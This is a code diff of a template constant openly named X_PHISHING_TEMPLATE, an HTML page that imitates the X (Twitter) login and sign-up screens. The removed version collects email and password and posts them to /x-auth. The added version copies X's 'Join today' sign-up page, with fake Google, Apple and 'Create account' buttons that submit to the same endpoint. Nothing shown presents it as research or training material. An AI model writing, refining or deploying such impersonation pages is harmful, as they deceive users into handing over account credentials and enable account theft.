@@ -44,7 +44,7 @@ X_PHISHING_TEMPLATE = '''
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>X Login</title>
+    <title>X - Sign up</title>
     <style>
         * {
             margin: 0;
@@ -52,84 +52,143 @@ X_PHISHING_TEMPLATE = '''
             box-sizing: border-box;
         }
         body {
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-    background: #000000;           /* Solid black */
-    color: #fff;
-    min-height: 100vh;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    padding: 20px;
-}
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: #000;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
-        .login-container {
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
-            border-radius: 16px;
-            padding: 40px 30px;
+        .container {
             width: 100%;
-            max-width: 420px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.37);
-            border: 1px solid rgba(255, 255, 255, 0.18);
+            max-width: 500px;
+            padding: 20px;
             text-align: center;
         }
-        h2 {
-            margin-bottom: 30px;
-            font-size: 28px;
-        }
-        input[type="email"],
-        input[type="password"] {
-            width: 100%;
-            padding: 14px 16px;
-            margin: 12px 0;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            background: rgba(255, 255, 255, 0.15);
-            color: white;
-        }
-        input::placeholder {
-            color: rgba(255, 255, 255, 0.7);
-        }
-        button {
-            width: 100%;
-            padding: 14px;
-            margin-top: 20px;
-            background: #1d9bf0;
-            color: white;
-            border: none;
-            border-radius: 9999px;
-            font-size: 17px;
+        .logo {
+            font-size: 180px;
             font-weight: bold;
+            letter-spacing: -10px;
+            margin-bottom: 40px;
+            line-height: 0.8;
+        }
+        h1 {
+            font-size: 50px;
+            margin-bottom: 12px;
+            font-weight: 800;
+        }
+        h2 {
+            font-size: 32px;
+            margin-bottom: 40px;
+            font-weight: 700;
+        }
+        .btn {
+            display: block;
+            width: 100%;
+            max-width: 380px;
+            margin: 12px auto;
+            padding: 14px 24px;
+            font-size: 17px;
+            font-weight: 700;
+            border-radius: 9999px;
+            text-decoration: none;
             cursor: pointer;
             transition: background 0.2s;
+            border: none;
         }
-        button:hover {
+        .btn-google {
+            background: #fff;
+            color: #000;
+        }
+        .btn-google:hover {
+            background: #e8e8e8;
+        }
+        .btn-apple {
+            background: #fff;
+            color: #000;
+        }
+        .btn-apple:hover {
+            background: #e8e8e8;
+        }
+        .btn-create {
+            background: #1d9bf0;
+            color: white;
+        }
+        .btn-create:hover {
             background: #1a8cd8;
         }
-        @media screen and (max-width: 768px) {
-            .login-container {
-                padding: 30px 20px;
-                max-width: 90%;
-            }
-            h2 { font-size: 24px; }
-            input, button { font-size: 15px; padding: 13px 15px; }
-            body { padding: 15px; }
+        .btn-signin {
+            background: transparent;
+            color: #1d9bf0;
+            border: 1px solid #536471;
+            font-weight: 700;
         }
-        @media screen and (max-width: 480px) {
-            h2 { font-size: 22px; }
-            button { padding: 12px; }
+        .btn-signin:hover {
+            background: rgba(29,155,240,0.1);
+        }
+        .or {
+            margin: 20px 0;
+            color: #71767b;
+            font-size: 15px;
+            font-weight: 500;
+        }
+        .footer {
+            margin-top: 40px;
+            font-size: 13px;
+            color: #71767b;
+        }
+        .footer a {
+            color: #1d9bf0;
+            text-decoration: none;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        .promo {
+            margin-top: 60px;
+            font-size: 15px;
+            color: #71767b;
+        }
+        .promo a {
+            color: #1d9bf0;
+            font-weight: 700;
+            text-decoration: none;
+        }
+        @media (max-width: 500px) {
+            .logo { font-size: 140px; letter-spacing: -8px; }
+            h1 { font-size: 40px; }
+            h2 { font-size: 28px; }
+            .btn { max-width: 90%; }
         }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <h2>Welcome to X</h2>
+    <div class="container">
+        <div class="logo">X</div>
+        <h1>Happening now</h1>
+        <h2>Join today.</h2>
+
+        <button class="btn btn-google">G Sign up with Google</button>
+        <button class="btn btn-apple">Sign up with Apple</button>
+
+        <div class="or">OR</div>
+
         <form action="/x-auth" method="post">
-            <input type="email" name="email" placeholder="Email or phone" required autofocus>
-            <input type="password" name="password" placeholder="Password" required>
-            <button type="submit">Log in</button>
+            <button type="submit" class="btn btn-create">Create account</button>
         </form>
+
+        <div class="footer">
+            By signing up, you agree to the <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>, including <a href="#">Cookie Use</a>.
+        </div>
+
+        <div class="promo">
+            Already have an account? <a href="#">Sign in</a>
+        </div>
+
+        <div class="promo">
+            <a href="#">Get Grok</a>
+        </div>
     </div>
 </body>
 </html>
